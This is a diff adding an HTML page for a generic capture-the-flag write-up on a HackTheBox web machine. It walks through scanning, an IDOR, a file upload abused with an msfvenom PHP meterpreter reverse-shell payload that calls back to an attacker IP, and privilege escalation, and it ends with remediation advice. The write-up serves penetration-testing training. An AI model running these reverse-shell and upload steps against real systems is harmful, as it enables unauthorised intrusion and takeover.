@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Example CTF Challenge - seby0x.dev</title>
+  <link rel="stylesheet" href="../css/styles.css">
+</head>
+<body>
+  <nav>
+    <div class="container nav-content">
+      <a href="../index.html" class="brand">
+        <span class="sby">sby</span><span class="hex">0x</span>
+      </a>
+      <div class="nav-links">
+        <a href="../index.html">Home</a>
+        <a href="../ctf.html" class="active">CTF</a>
+        <a href="../research.html">Research</a>
+        <a href="../about.html">About</a>
+      </div>
+    </div>
+  </nav>
+
+  <section class="section">
+    <div class="container writeup-content">
+      <div class="writeup-header">
+        <h1 class="writeup-title">Example CTF Challenge</h1>
+        <div class="writeup-meta">
+          <span class="badge badge-cyan">HackTheBox</span>
+          <span class="badge badge-green">Medium</span>
+          <span class="badge badge-gray">Web</span>
+          <span class="badge badge-gray">Burp Suite</span>
+          <span class="badge badge-gray">Python</span>
+        </div>
+      </div>
+
+      <div class="writeup-section">
+        <h3>Reconnaissance</h3>
+        <p>Start by enumerating the target and gathering information about the services running.</p>
+        <div class="code-block">
+          <code>nmap -sC -sV -oA nmap/scan 10.10.10.100</code>
+        </div>
+        <p>The scan reveals a web server running on port 80 and SSH on port 22. Let's explore the web application first.</p>
+        <div class="code-block">
+          <code>gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt</code>
+        </div>
+      </div>
+
+      <div class="writeup-section">
+        <h3>Enumeration</h3>
+        <p>Found several interesting directories including /admin, /uploads, and /api. The admin panel requires authentication, but we can try common credentials or look for vulnerabilities.</p>
+        <ul>
+          <li>/admin - Login page with username/password fields</li>
+          <li>/uploads - Directory listing enabled</li>
+          <li>/api/v1/users - JSON endpoint returning user data</li>
+        </ul>
+      </div>
+
+      <div class="writeup-section">
+        <h3>Exploitation</h3>
+        <p>The API endpoint has an IDOR vulnerability that allows us to enumerate other users' data. By iterating through user IDs, we can find an admin account.</p>
+        <div class="code-block">
+          <code>curl http://10.10.10.100/api/v1/users/1</code>
+        </div>
+        <p>We discover that user ID 1 is an admin with a weak password. Using the credentials, we access the admin panel and find a file upload functionality that's vulnerable to unrestricted file upload.</p>
+        <div class="code-block">
+          <code>msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw > shell.php</code>
+        </div>
+      </div>
+
+      <div class="writeup-section">
+        <h3>Post-Exploitation</h3>
+        <p>After uploading the shell, we get a reverse shell and start enumerating the system for privilege escalation vectors.</p>
+        <div class="code-block">
+          <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code>
+        </div>
+        <div class="code-block">
+          <code>linpeas.sh</code>
+        </div>
+        <p>LinPEAS reveals a SUID binary with a known vulnerability. Exploiting it gives us root access.</p>
+      </div>
+
+      <div class="remediation-box">
+        <h4>Remediation</h4>
+        <p>To prevent this vulnerability:</p>
+        <ul>
+          <li>Implement proper authentication and authorization checks on API endpoints</li>
+          <li>Validate and restrict file uploads to allowed types only</li>
+          <li>Remove SUID binaries that are not absolutely necessary</li>
+          <li>Keep systems updated with the latest security patches</li>
+        </ul>
+      </div>
+
+      <div class="writeup-section">
+        <h3>Lessons Learned</h3>
+        <p>This challenge demonstrated the importance of proper input validation, access controls, and the dangers of misconfigured file upload functionality. Always assume that user input is malicious and validate accordingly.</p>
+      </div>
+    </div>
+  </section>
+</body>
+</html>
